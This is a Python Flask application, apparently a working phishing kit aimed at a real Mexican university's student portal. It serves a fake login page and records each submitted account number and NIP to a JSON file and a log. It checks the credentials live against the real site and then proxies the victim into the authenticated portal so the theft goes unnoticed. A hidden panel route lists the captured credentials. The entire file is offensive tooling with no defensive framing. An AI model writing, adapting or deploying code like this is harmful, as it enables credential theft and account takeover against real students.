import os
import json
import logging
import secrets
import threading
from datetime import datetime
from urllib.parse import urljoin, urlsplit

import requests
from flask import (Flask, request, render_template, redirect,
                   Response, make_response)

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY") or os.urandom(24)

# --- Objetivo real -----------------------------------------------------------
BASE = "https://siia.uasnet.mx"
RUTA_LOGIN = "/alumnos/Default.php"      # aqui se crea la sesion PHP
DESTINO_REAL = BASE + "/alumnos/home.php"  # action real del formulario

PUERTO = int(os.environ.get("PORT", 5000))
RUTA_PANEL = os.environ.get("RUTA_PANEL", "panel")
ARCHIVO = "capturas.json"
TIMEOUT = 20
UA_DEFECTO = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

_lock = threading.Lock()
_sesiones = {}            # sid -> requests.Session (cookie PHPSESSID vive aqui)
_sesiones_lock = threading.Lock()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("capturas.log", encoding="utf-8"),
              logging.StreamHandler()],
)


def cargar():
    try:
        with open(ARCHIVO, encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []


def guardar(datos):
    with open(ARCHIVO, "w", encoding="utf-8") as f:
        json.dump(datos, f, ensure_ascii=False, indent=2)


def _a_local(url):
    """Convierte una URL del portal real en ruta local nuestra."""
    p = urlsplit(url)
    if p.netloc and p.netloc != urlsplit(BASE).netloc:
        return url
    ruta = p.path or "/alumnos/home.php"
    return ruta + (("?" + p.query) if p.query else "")


# --- Login falso -------------------------------------------------------------
@app.route("/")
@app.route("/login")
def login():
    return render_template("login.html", error=None)


@app.route("/login", methods=["POST"])
def capturar():
    cuenta = (request.form.get("txtCuenta") or "").strip()[:20]
    nip = (request.form.get("txtNip") or "").strip()[:20]

    if not cuenta or not nip:
        return render_template("login.html", error="No. Cuenta o NIP incorrectos",
                               cuenta=cuenta), 400

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent") or UA_DEFECTO

    s = requests.Session()
    s.headers.update({
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "es-MX,es;q=0.9",
        "Referer": BASE + RUTA_LOGIN,
        "Origin": BASE,
        "X-Forwarded-For": ip,
    })

    try:
        s.get(BASE + RUTA_LOGIN, timeout=TIMEOUT)          # obtiene PHPSESSID
        r = s.post(DESTINO_REAL,
                   data={"txtCuenta": cuenta, "txtNip": nip, "Entrada": ""},
                   timeout=TIMEOUT, allow_redirects=True)
    except requests.RequestException as e:
        logging.warning("Red caida contra el portal: %s", e)
        return render_template("login.html",
                               error="Servicio no disponible, intenta de nuevo",
                               cuenta=cuenta), 502

    # Si sigue apareciendo el formulario o el error 12, el NIP no sirvio.
    valido = "Debe proporcionar" not in r.text and 'name="txtNip"' not in r.text

    with _lock:
        capturas = cargar()
        capturas.append({
            "cuenta": cuenta, "nip": nip, "valido": valido, "ip": ip,
            "ua": ua[:200], "fecha": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        })
        guardar(capturas)

    logging.info("CAPTURA cuenta=%s nip=%s valido=%s ip=%s",
                 cuenta, nip, valido, ip)

    if not valido:
        return render_template("login.html",
                               error="No. Cuenta o NIP incorrectos",
                               cuenta=cuenta), 401

    # Credenciales buenas: guardamos la sesion del portal y damos paso.
    sid = secrets.token_urlsafe(24)
    with _sesiones_lock:
        _sesiones[sid] = s

    resp = redirect(_a_local(r.url), code=302)
    resp.set_cookie("sid", sid, httponly=True, samesite="Lax", max_age=3600)
    return resp


# --- Proxy del portal autenticado -------------------------------------------
@app.route("/<path:ruta>", methods=["GET", "POST"])
def proxy(ruta):
    if ruta.strip("/") == RUTA_PANEL:
        return panel()

    sid = request.cookies.get("sid")
    with _sesiones_lock:
        s = _sesiones.get(sid) if sid else None
    if s is None:
        return redirect("/", code=302)          # sesion caducada -> al login

    url = BASE + "/" + ruta
    if request.query_string:
        url += "?" + request.query_string.decode()

    cabeceras = {
        "Referer": url,
        "X-Forwarded-For": request.headers.get("X-Forwarded-For", request.remote_addr),
    }
    cuerpo = None
    if request.method == "POST":
        cuerpo = request.get_data()
        cabeceras["Content-Type"] = request.headers.get(
            "Content-Type", "application/x-www-form-urlencoded")

    try:
        r = s.request(request.method, url, data=cuerpo, headers=cabeceras,
                      timeout=TIMEOUT, allow_redirects=False)
    except requests.RequestException:
        return "Portal no disponible", 502

    tipo = r.headers.get("Content-Type", "text/html")
    datos = r.content

    if "text/html" in tipo:
        # El portal es windows-1252 y usa URLs absolutas: reescribimos ambas.
        texto = datos.decode("windows-1252", errors="replace")
        texto = texto.replace(BASE + "/", "/").replace(BASE, "/")
        datos = texto.encode("utf-8")
        tipo = tipo.replace("windows-1252", "utf-8").replace("iso-8859-1", "utf-8")

    resp = Response(datos, status=r.status_code, content_type=tipo)
    if "Location" in r.headers:
        resp.headers["Location"] = _a_local(urljoin(url, r.headers["Location"]))
    resp.headers["Cache-Control"] = "no-store"
    return resp


# --- Panel -------------------------------------------------------------------
@app.route("/" + RUTA_PANEL)
def panel():
    with _lock:
        capturas = cargar()
    return render_template("panel.html", credenciales=list(reversed(capturas)))


if __name__ == "__main__":
    logging.info("Falsa: / | Panel: /%s | Puente: %s", RUTA_PANEL, DESTINO_REAL)
    app.run(host="0.0.0.0", port=PUERTO, debug=False)